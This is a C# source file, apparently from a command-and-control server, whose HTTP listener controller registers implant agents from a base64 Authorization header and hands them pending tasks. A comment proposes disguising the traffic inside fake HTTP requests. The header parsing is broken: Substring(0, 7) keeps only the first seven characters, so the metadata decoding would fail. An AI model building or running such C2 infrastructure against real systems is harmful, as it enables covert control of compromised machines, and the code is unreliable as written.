﻿using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using TeamServer.Models.Agents;
using TeamServer.Services;


namespace TeamServer.Models.Listeners
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private readonly IAgentService _agents;

        public HttpListenerController(IAgentService agents)
        {
            _agents = agents;
        }

        public IActionResult HandleImplant()
        {
            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata is null) return NotFound();

            var agent = _agents.GetAgent(metadata.Id);
            if (agent is null)
            {
                agent = new Agent(metadata);
                _agents.AddAgent(agent);
            }

            var tasks = agent.GetPendingTasks();

            //When you pass data into these object result methods, they automatically get serialized as JSON
            //We could also take this data and hide it into a bigger fake http request or something similar
            return Ok(tasks);
        }

        private AgentMetaData ExtractMetadata(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                return null;

            encodedMetadata = encodedMetadata.ToString().Substring(0, 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));
            return JsonConvert.DeserializeObject<AgentMetaData>(json);
        }

    }
}
